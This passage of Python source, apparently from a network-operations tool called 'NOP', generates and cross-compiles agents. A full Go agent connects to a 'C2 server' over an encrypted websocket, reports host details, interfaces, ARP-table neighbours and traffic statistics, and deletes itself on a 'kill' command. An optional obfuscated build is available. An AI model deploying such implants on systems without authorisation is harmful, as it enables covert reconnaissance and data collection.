                            "src_port": flow['src_port'],
                            "dst_port": flow['dst_port'],
                            "protocol": flow['protocol'],
                            "bytes": 0,
                            "packets": 0,
                            "first_seen": flow['timestamp'],
                            "last_seen": flow['timestamp']
                        }}
                    aggregated[key]['bytes'] += flow['bytes']
                    aggregated[key]['packets'] += 1
                    aggregated[key]['last_seen'] = flow['timestamp']
                
                flows_list = list(aggregated.values())
                
                if flows_list:
                    print(f"[{{datetime.now()}}] Sending {{len(flows_list)}} aggregated flows")
                
                await self.relay_to_c2({{
                    "type": "traffic_data",
                    "agent_id": self.agent_id,
                    "traffic": traffic_stats,
                    "flows": flows_list,
                    "timestamp": datetime.utcnow().isoformat()
                }})
            except Exception as e:
                print(f"[{{datetime.now()}}] Traffic module error: {{e}}")
                
    async def capture_traffic_stats(self) -> Dict:
        """Capture network traffic statistics"""
        try:
            net_io = psutil.net_io_counters()
            return {{
                "bytes_sent": net_io.bytes_sent,
                "bytes_recv": net_io.bytes_recv,
                "packets_sent": net_io.packets_sent,
                "packets_recv": net_io.packets_recv,
                "errors_in": net_io.errin,
                "errors_out": net_io.errout
            }}
        except Exception as e:
            print(f"[{{datetime.now()}}] Traffic capture error: {{e}}")
            return {{}}
    
    # ============================================================================
    # HOST MODULE - Host system information and monitoring
    # ============================================================================
    async def host_module(self):
        """Host Monitoring Module - Monitors local system resources"""
        print(f"[{{datetime.now()}}] Host module started")
        while self.running:
            try:
                await asyncio.sleep(120)  # Send stats every 2 minutes
                host_info = await self.collect_host_info()
                await self.relay_to_c2({{
                    "type": "host_data",
                    "agent_id": self.agent_id,
                    "host": host_info,
                    "timestamp": datetime.utcnow().isoformat()
                }})
            except Exception as e:
                print(f"[{{datetime.now()}}] Host module error: {{e}}")
                
    async def collect_host_info(self) -> Dict:
        """Collect host system information"""
        try:
            # Collect network interfaces
            interfaces = []
            try:
                import netifaces
                for iface in netifaces.interfaces():
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        for addr in addrs[netifaces.AF_INET]:
                            interfaces.append({{
                                "name": iface,
                                "ip": addr.get('addr', ''),
                                "status": "up"
                            }})
            except Exception as e:
                print(f"[{{datetime.now()}}] Interface collection error: {{e}}")
            
            return {{
                "hostname": socket.gethostname(),
                "platform": platform.system(),
                "platform_release": platform.release(),
                "platform_version": platform.version(),
                "architecture": platform.machine(),
                "processor": platform.processor(),
                "cpu_percent": psutil.cpu_percent(interval=1),
                "memory_percent": psutil.virtual_memory().percent,
                "disk_percent": psutil.disk_usage('/').percent,
                "boot_time": datetime.fromtimestamp(psutil.boot_time()).isoformat(),
                "interfaces": interfaces
            }}
        except Exception as e:
            print(f"[{{datetime.now()}}] Host info collection error: {{e}}")
            return {{}}
    
    # ============================================================================
    # ACCESS MODULE - Remote access and command execution
    # ============================================================================
    async def access_module(self):
        """Access Module - Provides remote access capabilities"""
        print(f"[{{datetime.now()}}] Access module started (listen-only mode)")
        # Access module only responds to C2 commands for security
        # No autonomous actions
        
    async def relay_to_c2(self, data: Dict):
        """Relay data to C2 server"""
        try:
            if self.ws:
                await self.ws.send(json.dumps(data))
        except Exception as e:
            print(f"[{{datetime.now()}}] Relay error: {{e}}")
            
    async def send_pong(self):
        """Respond to ping from C2"""
        pong = {{
            "type": "pong",
            "agent_id": self.agent_id,
            "timestamp": datetime.utcnow().isoformat()
        }}
        await self.ws.send(json.dumps(pong))
        
    async def run(self):
        """Main run loop"""
        print(f"[{{datetime.now()}}] NOP Agent '{{self.agent_name}}' starting...")
        print(f"[{{datetime.now()}}] Enabled modules: {{', '.join([k for k, v in self.capabilities.items() if v])}}")
        
        while self.running:
            try:
                await self.connect()
            except KeyboardInterrupt:
                print(f"[{{datetime.now()}}] Agent stopped by user")
                self.running = False
                break
            except Exception as e:
                print(f"[{{datetime.now()}}] Error: {{e}}")
                await asyncio.sleep(5)

if __name__ == "__main__":
    agent = NOPAgent()
    asyncio.run(agent.run())
'''
        return template
    
    @staticmethod
    def generate_go_agent(agent: Agent) -> str:
        """Generate complete Go agent with all modules matching Python agent functionality"""
        # Replace {agent_id} placeholder in connection URL
        server_url = agent.connection_url.replace('{agent_id}', str(agent.id))
        
        # Format capabilities for Go
        caps_items = ', '.join([f'"{k}": {str(v).lower()}' for k, v in agent.capabilities.items()])
        capabilities_go = '{' + caps_items + '}'
        
        # Get config from agent_metadata or use defaults
        config = agent.agent_metadata or {}
        config_items = []
        for k, v in config.items():
            if isinstance(v, str):
                config_items.append(f'"{k}": "{v}"')
            elif isinstance(v, bool):
                config_items.append(f'"{k}": {str(v).lower()}')
            elif isinstance(v, (int, float)):
                config_items.append(f'"{k}": float64({v})')
            else:
                config_items.append(f'"{k}": "{v}"')
        config_go = '{' + ', '.join(config_items) + '}' if config_items else '{}'
        
        return f'''package main

/*
NOP Agent - {agent.name}
Generated: {datetime.utcnow().isoformat()}
Type: Go Proxy Agent (cross-platform)
Encryption: AES-256-GCM (Encrypted tunnel to C2)

This agent acts as a proxy, relaying all data from the remote network
back to the NOP C2 server. All modules run here but data is processed
on the main NOP instance.

Build commands:
  Linux:   GOOS=linux GOARCH=amd64 go build -o nop-agent-linux
  Windows: GOOS=windows GOARCH=amd64 go build -o nop-agent.exe
  macOS:   GOOS=darwin GOARCH=amd64 go build -o nop-agent-macos
  ARM:     GOOS=linux GOARCH=arm64 go build -o nop-agent-arm

Dependencies:
  go get github.com/gorilla/websocket
  go get github.com/shirou/gopsutil/v3
  go get golang.org/x/crypto
*/

import (
\t"crypto/aes"
\t"crypto/cipher"
\t"crypto/rand"
\t"crypto/sha256"
\t"encoding/base64"
\t"encoding/json"
\t"fmt"
\t"io"
\t"log"
\t"net"
\t"net/url"
\t"os"
\t"os/exec"
\t"os/signal"
\t"runtime"
\t"strings"
\t"sync"
\t"syscall"
\t"time"

\t"github.com/gorilla/websocket"
\t"github.com/shirou/gopsutil/v3/cpu"
\t"github.com/shirou/gopsutil/v3/disk"
\t"github.com/shirou/gopsutil/v3/host"
\t"github.com/shirou/gopsutil/v3/mem"
\tpsnet "github.com/shirou/gopsutil/v3/net"
\t"golang.org/x/crypto/pbkdf2"
)

const (
\tAgentID       = "{agent.id}"
\tAgentName     = "{agent.name}"
\tAuthToken     = "{agent.auth_token}"
\tEncryptionKey = "{agent.encryption_key}"
\tServerURL     = "{server_url}"
)

var Capabilities = map[string]bool{capabilities_go}
var Config = map[string]interface{{}}{config_go}

type NOPAgent struct {{
\tconn            *websocket.Conn
\tagentID         string
\tagentName       string
\tauthToken       string
\tencryptionKey   []byte
\tserverURL       string
\tcapabilities    map[string]bool
\tconfig          map[string]interface{{}}
\trunning         bool
\tcipher          cipher.AEAD
\tpassiveHosts    []map[string]interface{{}}
\thostsMutex      sync.Mutex
\tconnMutex       sync.Mutex
}}

type Message struct {{
\tType       string                 `json:"type"`
\tAgentID    string                 `json:"agent_id,omitempty"`
\tAgentName  string                 `json:"agent_name,omitempty"`
\tAuthToken  string                 `json:"auth_token,omitempty"`
\tEncrypted  bool                   `json:"encrypted,omitempty"`
\tData       interface{{}}            `json:"data,omitempty"`
\tTimestamp  string                 `json:"timestamp,omitempty"`
\tMessage    string                 `json:"message,omitempty"`
\tSystemInfo map[string]interface{{}} `json:"system_info,omitempty"`
}}

type AssetData struct {{
\tType      string                   `json:"type"`
\tAgentID   string                   `json:"agent_id"`
\tAssets    []map[string]interface{{}} `json:"assets"`
\tTimestamp string                   `json:"timestamp"`
}}

type TrafficData struct {{
\tType      string                 `json:"type"`
\tAgentID   string                 `json:"agent_id"`
\tTraffic   map[string]interface{{}} `json:"traffic"`
\tTimestamp string                 `json:"timestamp"`
}}

type HostData struct {{
\tType      string                 `json:"type"`
\tAgentID   string                 `json:"agent_id"`
\tHost      map[string]interface{{}} `json:"host"`
\tTimestamp string                 `json:"timestamp"`
}}

func NewNOPAgent() *NOPAgent {{
\tagent := &NOPAgent{{
\t\tagentID:       AgentID,
\t\tagentName:     AgentName,
\t\tauthToken:     AuthToken,
\t\tencryptionKey: []byte(EncryptionKey),
\t\tserverURL:     ServerURL,
\t\tcapabilities:  Capabilities,
\t\tconfig:        Config,
\t\trunning:       true,
\t\tpassiveHosts:  make([]map[string]interface{{}}, 0),
\t}}
\tagent.initCipher()
\treturn agent
}}

func (a *NOPAgent) initCipher() {{
\t// Derive key using PBKDF2
\tsalt := []byte("nop_c2_salt_2026")
\tkey := pbkdf2.Key(a.encryptionKey, salt, 100000, 32, sha256.New)

\tblock, err := aes.NewCipher(key)
\tif err != nil {{
\t\tlog.Printf("[%s] Cipher init error: %v", time.Now().Format(time.RFC3339), err)
\t\treturn
\t}}

\tgcm, err := cipher.NewGCM(block)
\tif err != nil {{
\t\tlog.Printf("[%s] GCM init error: %v", time.Now().Format(time.RFC3339), err)
\t\treturn
\t}}

\ta.cipher = gcm
}}

func (a *NOPAgent) encryptMessage(data string) (string, error) {{
\tnonce := make([]byte, a.cipher.NonceSize())
\tif _, err := io.ReadFull(rand.Reader, nonce); err != nil {{
\t\treturn "", err
\t}}

\tciphertext := a.cipher.Seal(nonce, nonce, []byte(data), nil)
\treturn base64.StdEncoding.EncodeToString(ciphertext), nil
}}

func (a *NOPAgent) decryptMessage(encryptedData string) (string, error) {{
\tdata, err := base64.StdEncoding.DecodeString(encryptedData)
\tif err != nil {{
\t\treturn "", err
\t}}

\tnonceSize := a.cipher.NonceSize()
\tif len(data) < nonceSize {{
\t\treturn "", fmt.Errorf("ciphertext too short")
\t}}

\tnonce, ciphertext := data[:nonceSize], data[nonceSize:]
\tplaintext, err := a.cipher.Open(nil, nonce, ciphertext, nil)
\tif err != nil {{
\t\treturn "", err
\t}}

\treturn string(plaintext), nil
}}

func (a *NOPAgent) sendEncrypted(message interface{{}}) error {{
\tjsonStr, err := json.Marshal(message)
\tif err != nil {{
\t\treturn err
\t}}

\tencrypted, err := a.encryptMessage(string(jsonStr))
\tif err != nil {{
\t\treturn err
\t}}

\tencryptedMsg := map[string]interface{{}}{{
\t\t"encrypted": true,
\t\t"data":      encrypted,
\t}}

\ta.connMutex.Lock()
\tdefer a.connMutex.Unlock()
\treturn a.conn.WriteJSON(encryptedMsg)
}}

func (a *NOPAgent) Connect() error {{
\tlog.Printf("[%s] Connecting to C2 server: %s", time.Now().Format(time.RFC3339), a.serverURL)

\tu, err := url.Parse(a.serverURL)
\tif err != nil {{
\t\treturn fmt.Errorf("invalid server URL: %v", err)
\t}}

\theader := make(map[string][]string)
\theader["Authorization"] = []string{{fmt.Sprintf("Bearer %s", a.authToken)}}

\tdialer := websocket.Dialer{{
\t\tHandshakeTimeout: 10 * time.Second,
\t}}

\tconn, _, err := dialer.Dial(u.String(), header)
\tif err != nil {{
\t\treturn fmt.Errorf("connection failed: %v", err)
\t}}

\ta.conn = conn
\tlog.Printf("[%s] Connected! Establishing encrypted tunnel...", time.Now().Format(time.RFC3339))

\treturn nil
}}

func (a *NOPAgent) Register() error {{
\thostname, _ := os.Hostname()

\t// Get IP addresses
\taddrs, _ := net.InterfaceAddrs()
\tvar primaryIP string
\tfor _, addr := range addrs {{
\t\tif ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {{
\t\t\tprimaryIP = ipnet.IP.String()
\t\t\tbreak
\t\t}}
\t}}

\treg := Message{{
\t\tType:      "register",
\t\tAgentID:   a.agentID,
\t\tAgentName: a.agentName,
\t\tAuthToken: a.authToken,
\t\tTimestamp: time.Now().UTC().Format(time.RFC3339),
\t\tData: map[string]interface{{}}{{
\t\t\t"capabilities": a.capabilities,
\t\t}},
\t\tSystemInfo: map[string]interface{{}}{{
\t\t\t"hostname":   hostname,
\t\t\t"platform":   runtime.GOOS,
\t\t\t"version":    runtime.Version(),
\t\t\t"ip_address": primaryIP,
\t\t\t"arch":       runtime.GOARCH,
\t\t}},
\t}}

\ta.connMutex.Lock()
\terr := a.conn.WriteJSON(reg)
\ta.connMutex.Unlock()

\tif err != nil {{
\t\treturn fmt.Errorf("registration failed: %v", err)
\t}}

\tlog.Printf("[%s] Registered with C2 server", time.Now().Format(time.RFC3339))
\treturn nil
}}

func (a *NOPAgent) Heartbeat() {{
\tinterval := 30 * time.Second
\tif val, ok := a.config["heartbeat_interval"]; ok {{
\t\tif i, ok := val.(float64); ok {{
\t\t\tinterval = time.Duration(i) * time.Second
\t\t}}
\t}}

\tticker := time.NewTicker(interval)
\tdefer ticker.Stop()

\tfor a.running {{
\t\tselect {{
\t\tcase <-ticker.C:
\t\t\thb := Message{{
\t\t\t\tType:      "heartbeat",
\t\t\t\tAgentID:   a.agentID,
\t\t\t\tTimestamp: time.Now().UTC().Format(time.RFC3339),
\t\t\t}}
\t\t\ta.connMutex.Lock()
\t\t\terr := a.conn.WriteJSON(hb)
\t\t\ta.connMutex.Unlock()
\t\t\tif err != nil {{
\t\t\t\tlog.Printf("[%s] Heartbeat error: %v", time.Now().Format(time.RFC3339), err)
\t\t\t\treturn
\t\t\t}}
\t\t}}
\t}}
}}

func (a *NOPAgent) MessageHandler() {{
\tfor a.running {{
\t\tvar msg map[string]interface{{}}
\t\terr := a.conn.ReadJSON(&msg)
\t\tif err != nil {{
\t\t\tlog.Printf("[%s] Read error: %v", time.Now().Format(time.RFC3339), err)
\t\t\treturn
\t\t}}

\t\tmsgType, _ := msg["type"].(string)

\t\tswitch msgType {{
\t\tcase "terminate":
\t\t\tlog.Printf("[%s] Terminate command received from C2", time.Now().Format(time.RFC3339))
\t\t\tif message, ok := msg["message"].(string); ok {{
\t\t\t\tlog.Printf("[%s] Message: %s", time.Now().Format(time.RFC3339), message)
\t\t\t}}
\t\t\ta.running = false
\t\t\treturn

\t\tcase "kill":
\t\t\tlog.Printf("[%s] KILL command received - Self-destructing...", time.Now().Format(time.RFC3339))
\t\t\tif message, ok := msg["message"].(string); ok {{
\t\t\t\tlog.Printf("[%s] Message: %s", time.Now().Format(time.RFC3339), message)
\t\t\t}}
\t\t\ta.running = false
\t\t\t// Attempt to delete self
\t\t\texecutable, err := os.Executable()
\t\t\tif err == nil {{
\t\t\t\tlog.Printf("[%s] Deleting agent file: %s", time.Now().Format(time.RFC3339), executable)
\t\t\t\tos.Remove(executable)
\t\t\t}}
\t\t\treturn

\t\tcase "command":
\t\t\ta.handleCommand(msg)

\t\tcase "ping":
\t\t\ta.sendPong()

\t\tcase "settings_update":
\t\t\ta.handleSettingsUpdate(msg)
\t\t}}
\t}}
}}

func (a *NOPAgent) handleCommand(msg map[string]interface{{}}) {{
\tif cmd, ok := msg["command"].(string); ok {{
\t\tlog.Printf("[%s] Received command: %s", time.Now().Format(time.RFC3339), cmd)
\t}}
}}

func (a *NOPAgent) handleSettingsUpdate(msg map[string]interface{{}}) {{
\tif settings, ok := msg["settings"].(map[string]interface{{}}); ok {{
\t\tlog.Printf("[%s] Settings update received from C2", time.Now().Format(time.RFC3339))
\t\tfor k, v := range settings {{
\t\t\ta.config[k] = v
\t\t}}
\t}}
}}

func (a *NOPAgent) sendPong() {{
\tpong := Message{{
\t\tType:      "pong",
\t\tAgentID:   a.agentID,
\t\tTimestamp: time.Now().UTC().Format(time.RFC3339),
\t}}
\ta.connMutex.Lock()
\ta.conn.WriteJSON(pong)
\ta.connMutex.Unlock()
}}

func (a *NOPAgent) relayToC2(data interface{{}}) {{
\ta.connMutex.Lock()
\tdefer a.connMutex.Unlock()
\tif a.conn != nil {{
\t\tif err := a.conn.WriteJSON(data); err != nil {{
\t\t\tlog.Printf("[%s] Relay error: %v", time.Now().Format(time.RFC3339), err)
\t\t}}
\t}}
}}

// ============================================================================
// ASSET MODULE - Network asset discovery and monitoring
// ============================================================================
func (a *NOPAgent) AssetModule() {{
\tif !a.capabilities["asset"] {{
\t\treturn
\t}}
\tlog.Printf("[%s] Asset module started", time.Now().Format(time.RFC3339))

\tinterval := 300 * time.Second
\tif val, ok := a.config["discovery_interval"]; ok {{
\t\tif i, ok := val.(float64); ok && i > 0 {{
\t\t\tinterval = time.Duration(i) * time.Second
\t\t}}
\t}}

\tticker := time.NewTicker(interval)
\tdefer ticker.Stop()

\t// Initial discovery
\ta.discoverAssets()

\tfor a.running {{
\t\tselect {{
\t\tcase <-ticker.C:
\t\t\ta.discoverAssets()
\t\t}}
\t}}
}}

func (a *NOPAgent) discoverAssets() {{
\tassets := make([]map[string]interface{{}}, 0)

\t// Get all network interfaces
\tifaces, err := net.Interfaces()
\tif err != nil {{
\t\tlog.Printf("[%s] Asset discovery error: %v", time.Now().Format(time.RFC3339), err)
\t\treturn
\t}}

\t// Collect local interface info as assets
\tfor _, iface := range ifaces {{
\t\tif iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {{
\t\t\tcontinue
\t\t}}

\t\taddrs, err := iface.Addrs()
\t\tif err != nil {{
\t\t\tcontinue
\t\t}}

\t\tfor _, addr := range addrs {{
\t\t\tipnet, ok := addr.(*net.IPNet)
\t\t\tif !ok || ipnet.IP.To4() == nil {{
\t\t\t\tcontinue
\t\t\t}}

\t\t\tasset := map[string]interface{{}}{{
\t\t\t\t"ip":            ipnet.IP.String(),
\t\t\t\t"mac":           iface.HardwareAddr.String(),
\t\t\t\t"status":        "online",
\t\t\t\t"discovered_at": time.Now().UTC().Format(time.RFC3339),
\t\t\t\t"interface":     iface.Name,
\t\t\t}}
\t\t\tassets = append(assets, asset)
\t\t}}
\t}}

\t// Try to discover local network hosts via ARP table
\tarpAssets := a.getArpTable()
\tassets = append(assets, arpAssets...)

\t// Add passively discovered hosts
\ta.hostsMutex.Lock()
\tassets = append(assets, a.passiveHosts...)
\ta.passiveHosts = make([]map[string]interface{{}}, 0)
\ta.hostsMutex.Unlock()

\tif len(assets) > 0 {{
\t\tlog.Printf("[%s] Discovered %d assets", time.Now().Format(time.RFC3339), len(assets))
\t\ta.relayToC2(AssetData{{
\t\t\tType:      "asset_data",
\t\t\tAgentID:   a.agentID,
\t\t\tAssets:    assets,
\t\t\tTimestamp: time.Now().UTC().Format(time.RFC3339),
\t\t}})
\t}}
}}

func (a *NOPAgent) getArpTable() []map[string]interface{{}} {{
\tassets := make([]map[string]interface{{}}, 0)

\t// Read ARP table from /proc/net/arp on Linux
\tif runtime.GOOS == "linux" {{
\t\tdata, err := os.ReadFile("/proc/net/arp")
\t\tif err != nil {{
\t\t\treturn assets
\t\t}}

\t\tlines := strings.Split(string(data), "\\n")
\t\tfor i, line := range lines {{
\t\t\tif i == 0 {{ // Skip header
\t\t\t\tcontinue
\t\t\t}}
\t\t\tfields := strings.Fields(line)
\t\t\tif len(fields) >= 4 {{
\t\t\t\tip := fields[0]
\t\t\t\tmac := fields[3]
\t\t\t\tif mac != "00:00:00:00:00:00" && ip != "" {{
\t\t\t\t\tassets = append(assets, map[string]interface{{}}{{
\t\t\t\t\t\t"ip":            ip,
\t\t\t\t\t\t"mac":           mac,
\t\t\t\t\t\t"status":        "online",
\t\t\t\t\t\t"discovered_at": time.Now().UTC().Format(time.RFC3339),
\t\t\t\t\t\t"method":        "arp_table",
\t\t\t\t\t}})
\t\t\t\t}}
\t\t\t}}
\t\t}}
\t}} else if runtime.GOOS == "windows" {{
\t\t// On Windows, use arp -a command
\t\tcmd := exec.Command("arp", "-a")
\t\toutput, err := cmd.Output()
\t\tif err == nil {{
\t\t\tlines := strings.Split(string(output), "\\n")
\t\t\tfor _, line := range lines {{
\t\t\t\tfields := strings.Fields(line)
\t\t\t\tif len(fields) >= 2 {{
\t\t\t\t\tip := fields[0]
\t\t\t\t\tif net.ParseIP(ip) != nil && len(fields) >= 2 {{
\t\t\t\t\t\tmac := fields[1]
\t\t\t\t\t\tassets = append(assets, map[string]interface{{}}{{
\t\t\t\t\t\t\t"ip":            ip,
\t\t\t\t\t\t\t"mac":           mac,
\t\t\t\t\t\t\t"status":        "online",
\t\t\t\t\t\t\t"discovered_at": time.Now().UTC().Format(time.RFC3339),
\t\t\t\t\t\t\t"method":        "arp_table",
\t\t\t\t\t\t}})
\t\t\t\t\t}}
\t\t\t\t}}
\t\t\t}}
\t\t}}
\t}}

\treturn assets
}}

// ============================================================================
// TRAFFIC MODULE - Network traffic monitoring and analysis
// ============================================================================
func (a *NOPAgent) TrafficModule() {{
\tif !a.capabilities["traffic"] {{
\t\treturn
\t}}
\tlog.Printf("[%s] Traffic module started", time.Now().Format(time.RFC3339))

\tinterval := 60 * time.Second
\tif val, ok := a.config["data_interval"]; ok {{
\t\tif i, ok := val.(float64); ok && i > 0 {{
\t\t\tinterval = time.Duration(i) * time.Second
\t\t}}
\t}}

\tticker := time.NewTicker(interval)
\tdefer ticker.Stop()

\tfor a.running {{
\t\tselect {{
\t\tcase <-ticker.C:
\t\t\tstats := a.captureTrafficStats()
\t\t\ta.relayToC2(TrafficData{{
\t\t\t\tType:      "traffic_data",
\t\t\t\tAgentID:   a.agentID,
\t\t\t\tTraffic:   stats,
\t\t\t\tTimestamp: time.Now().UTC().Format(time.RFC3339),
\t\t\t}})
\t\t}}
\t}}
}}

func (a *NOPAgent) captureTrafficStats() map[string]interface{{}} {{
\tstats := make(map[string]interface{{}})

\tnetStats, err := psnet.IOCounters(false) // false = aggregated stats
\tif err != nil {{
\t\tlog.Printf("[%s] Traffic capture error: %v", time.Now().Format(time.RFC3339), err)
\t\treturn stats
\t}}

\tif len(netStats) > 0 {{
\t\tstats["bytes_sent"] = netStats[0].BytesSent
\t\tstats["bytes_recv"] = netStats[0].BytesRecv
\t\tstats["packets_sent"] = netStats[0].PacketsSent
\t\tstats["packets_recv"] = netStats[0].PacketsRecv
\t\tstats["errors_in"] = netStats[0].Errin
\t\tstats["errors_out"] = netStats[0].Errout
\t}}

\treturn stats
}}

// ============================================================================
// HOST MODULE - Host system information and monitoring
// ============================================================================
func (a *NOPAgent) HostModule() {{
\tif !a.capabilities["host"] {{
\t\treturn
\t}}
\tlog.Printf("[%s] Host module started", time.Now().Format(time.RFC3339))

\tinterval := 120 * time.Second
\tticker := time.NewTicker(interval)
\tdefer ticker.Stop()

\t// Send initial host info
\ta.sendHostInfo()

\tfor a.running {{
\t\tselect {{
\t\tcase <-ticker.C:
\t\t\ta.sendHostInfo()
\t\t}}
\t}}
}}

func (a *NOPAgent) sendHostInfo() {{
\thostInfo := a.collectHostInfo()
\ta.relayToC2(HostData{{
\t\tType:      "host_data",
\t\tAgentID:   a.agentID,
\t\tHost:      hostInfo,
\t\tTimestamp: time.Now().UTC().Format(time.RFC3339),
\t}})
}}

func (a *NOPAgent) collectHostInfo() map[string]interface{{}} {{
\tinfo := make(map[string]interface{{}})

\t// Hostname
\thostname, _ := os.Hostname()
\tinfo["hostname"] = hostname

\t// Platform info
\tinfo["platform"] = runtime.GOOS
\tinfo["architecture"] = runtime.GOARCH
\tinfo["go_version"] = runtime.Version()

\t// Host info from gopsutil
\thostInfo, err := host.Info()
\tif err == nil {{
\t\tinfo["platform_release"] = hostInfo.Platform
\t\tinfo["platform_version"] = hostInfo.PlatformVersion
\t\tinfo["os"] = hostInfo.OS
\t\tinfo["kernel_version"] = hostInfo.KernelVersion
\t\tinfo["boot_time"] = time.Unix(int64(hostInfo.BootTime), 0).Format(time.RFC3339)
\t}}

\t// CPU
\tcpuPercent, err := cpu.Percent(time.Second, false)
\tif err == nil && len(cpuPercent) > 0 {{
\t\tinfo["cpu_percent"] = cpuPercent[0]
\t}}

\t// Memory
\tmemInfo, err := mem.VirtualMemory()
\tif err == nil {{
\t\tinfo["memory_percent"] = memInfo.UsedPercent
\t\tinfo["memory_total"] = memInfo.Total
\t\tinfo["memory_used"] = memInfo.Used
\t}}

\t// Disk
\tdiskInfo, err := disk.Usage("/")
\tif err == nil {{
\t\tinfo["disk_percent"] = diskInfo.UsedPercent
\t\tinfo["disk_total"] = diskInfo.Total
\t\tinfo["disk_used"] = diskInfo.Used
\t}}

\t// Network interfaces
\tinterfaces := make([]map[string]interface{{}}, 0)
\tifaces, err := net.Interfaces()
\tif err == nil {{
\t\tfor _, iface := range ifaces {{
\t\t\tif iface.Flags&net.FlagUp == 0 {{
\t\t\t\tcontinue
\t\t\t}}
\t\t\taddrs, _ := iface.Addrs()
\t\t\tfor _, addr := range addrs {{
\t\t\t\tipnet, ok := addr.(*net.IPNet)
\t\t\t\tif !ok || ipnet.IP.To4() == nil {{
\t\t\t\t\tcontinue
\t\t\t\t}}
\t\t\t\tinterfaces = append(interfaces, map[string]interface{{}}{{
\t\t\t\t\t"name":   iface.Name,
\t\t\t\t\t"ip":     ipnet.IP.String(),
\t\t\t\t\t"status": "up",
\t\t\t\t}})
\t\t\t}}
\t\t}}
\t}}
\tinfo["interfaces"] = interfaces

\treturn info
}}

// ============================================================================
// ACCESS MODULE - Remote access and command execution
// ============================================================================
func (a *NOPAgent) AccessModule() {{
\tif !a.capabilities["access"] {{
\t\treturn
\t}}
\tlog.Printf("[%s] Access module started (listen-only mode)", time.Now().Format(time.RFC3339))
\t// Access module only responds to C2 commands for security
\t// No autonomous actions
}}

// ============================================================================
// MAIN
// ============================================================================
func (a *NOPAgent) Run() {{
\tlog.Printf("[%s] NOP Agent '%s' starting...", time.Now().Format(time.RFC3339), a.agentName)

\tenabled := make([]string, 0)
\tfor module, isEnabled := range a.capabilities {{
\t\tif isEnabled {{
\t\t\tenabled = append(enabled, module)
\t\t}}
\t}}
\tlog.Printf("[%s] Enabled modules: %v", time.Now().Format(time.RFC3339), enabled)

\tfor a.running {{
\t\tif err := a.Connect(); err != nil {{
\t\t\tlog.Printf("[%s] Connection error: %v", time.Now().Format(time.RFC3339), err)
\t\t\ttime.Sleep(5 * time.Second)
\t\t\tcontinue
\t\t}}

\t\tif err := a.Register(); err != nil {{
\t\t\tlog.Printf("[%s] Registration error: %v", time.Now().Format(time.RFC3339), err)
\t\t\ttime.Sleep(5 * time.Second)
\t\t\tcontinue
\t\t}}

\t\t// Start modules
\t\tgo a.Heartbeat()
\t\tgo a.AssetModule()
\t\tgo a.TrafficModule()
\t\tgo a.HostModule()
\t\tgo a.AccessModule()

\t\t// Handle messages
\t\ta.MessageHandler()

\t\tif a.conn != nil {{
\t\t\ta.conn.Close()
\t\t}}

\t\tif a.running {{
\t\t\tlog.Printf("[%s] Reconnecting in 5 seconds...", time.Now().Format(time.RFC3339))
\t\t\ttime.Sleep(5 * time.Second)
\t\t}}
\t}}
}}

func main() {{
\tagent := NewNOPAgent()

\t// Handle graceful shutdown
\tsigChan := make(chan os.Signal, 1)
\tsignal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)

\tgo func() {{
\t\t<-sigChan
\t\tlog.Printf("[%s] Agent stopped by user", time.Now().Format(time.RFC3339))
\t\tagent.running = false
\t\tif agent.conn != nil {{
\t\t\tagent.conn.Close()
\t\t}}
\t\tos.Exit(0)
\t}}()

\tagent.Run()
}}
'''
    
    @staticmethod
    async def compile_go_agent(source_code: str, platform: str = "linux-amd64", obfuscate: bool = False) -> bytes:
        """
        Compile Go agent to binary for specified platform
        
        Platform options:
        - linux-amd64: Linux x64
        - windows-amd64: Windows x64
        - darwin-amd64: macOS x64 (Intel)
        - darwin-arm64: macOS ARM (M1/M2)
        - linux-arm64: Linux ARM64 (Raspberry Pi, etc)
        """
        import tempfile
        import subprocess
        import os
        
        # Parse platform
        parts = platform.split('-')
        if len(parts) != 2:
            raise ValueError(f"Invalid platform format: {platform}. Use format: OS-ARCH")
        
        goos, goarch = parts
        
        # Create temporary directory for Go project
        with tempfile.TemporaryDirectory() as tmpdir:
            # Write source code
            main_file = os.path.join(tmpdir, "main.go")
            with open(main_file, 'w') as f:
                f.write(source_code)
            
            # Create go.mod
            go_mod = os.path.join(tmpdir, "go.mod")
            with open(go_mod, 'w') as f:
                f.write("""module nop-agent

go 1.21

require (
    github.com/gorilla/websocket v1.5.1
    github.com/shirou/gopsutil/v3 v3.24.1
    golang.org/x/crypto v0.18.0
)
""")
            
            # Determine output filename
            output_name = "nop-agent"
            if goos == "windows":
                output_name += ".exe"
            
            output_path = os.path.join(tmpdir, output_name)
            
            # Set environment for cross-compilation
            env = os.environ.copy()
            env['GOOS'] = goos
            env['GOARCH'] = goarch
            env['CGO_ENABLED'] = '0'  # Disable CGO for static binaries
            
            try:
                # Initialize and download dependencies with go mod tidy
                # This creates go.sum and resolves all dependencies properly
                tidy_result = subprocess.run(
                    ['go', 'mod', 'tidy'],
                    cwd=tmpdir,
                    env=env,
                    check=True,
                    capture_output=True,
                    text=True
                )
                logger.info(f"go mod tidy completed successfully")
                
                # Build command - try garble if obfuscate is requested, fallback to go build
                use_garble = False
                if obfuscate:
                    # Check if garble is available
                    garble_check = subprocess.run(
                        ['which', 'garble'],
                        capture_output=True,
                        text=True
                    )
                    use_garble = garble_check.returncode == 0
                    if not use_garble:
                        logger.warning("Garble not installed, using standard go build (no obfuscation)")
                
                if use_garble:
                    # Use garble for obfuscation
                    build_cmd = [
                        'garble',
                        '-tiny',
                        '-literals',
                        'build',
                        '-ldflags=-w -s',  # Strip debug info
                        '-o', output_path,
                        'main.go'
                    ]
                else:
                    build_cmd = [
                        'go',
                        'build',
                        '-ldflags=-w -s',  # Strip debug info
                        '-o', output_path,
                        'main.go'
                    ]
                
                # Compile
                result = subprocess.run(
                    build_cmd,
                    cwd=tmpdir,
                    env=env,
                    capture_output=True,
                    text=True,
                    timeout=120
                )
                
                if result.returncode != 0:
                    raise RuntimeError(f"Compilation failed:\nSTDOUT: {result.stdout}\nSTDERR: {result.stderr}")
                
                # Read compiled binary
                with open(output_path, 'rb') as f:
                    return f.read()
                    
            except subprocess.TimeoutExpired:
                raise RuntimeError("Compilation timeout (>120s)")
            except FileNotFoundError as e:
                if 'go' in str(e):
                    raise RuntimeError("Go compiler not found. Install Go 1.21+")
                raise
